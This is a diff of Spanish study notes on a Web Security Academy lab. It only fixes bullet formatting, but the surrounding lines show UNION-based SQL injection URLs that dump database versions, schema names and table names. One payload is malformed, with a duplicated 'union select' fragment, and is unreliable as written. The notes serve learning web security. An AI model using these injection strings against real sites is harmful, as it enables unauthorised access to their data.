@@ -75,7 +75,7 @@ https://web-security-academy.net/filter?category=Pets' union select 'a','b' from
 https://web-security-academy.net/filter?category=Pets' union select 'a',banner from v$version-- -
 ```
 
--Ejemplo de MySQL y Microsoft
+- Ejemplo de MySQL y Microsoft
 
 ```
 https://web-security-academy.net/filter?category=Pets' union select 'a',@@version-- -
@@ -83,7 +83,7 @@ https://web-security-academy.net/filter?category=Pets' union select 'a',@@versio
 
 Otros ejemplos: 
 
--Extraer las bases de datos que hay en MYSQL
+- Extraer las bases de datos que hay en MYSQL
 
 ```
 https://web-security-academy.net/filter?category=Pets' union select 'a',union select 'a',schema_name from information_schema.schemata-- -
@@ -95,13 +95,13 @@ Enumerararlas usando `group_concat()`para concatenar todos los nombres en una so
 https://web-security-academy.net/filter?category=' union select NULL,group_concat(schema_name) from information_schema.schemata-- -
 ```
 
-Enumeramos todas las tablas de todas las bases de datos
+- Enumeramos todas las tablas de todas las bases de datos
 
 ```
 https://web-security-academy.net/filter?category=' union select NULL,table_name from information_schema.tables-- -
 ```
 
-Enumeramos las tablas de una base de datos en específico por ejemplo 'academy_labs'
+- Enumeramos las tablas de una base de datos en específico por ejemplo 'academy_labs'
 
 ```
 https://web-security-academy.net/filter?category=' union select NULL,table_name from information_schema.tables where table_schema='academy_labs'-- -
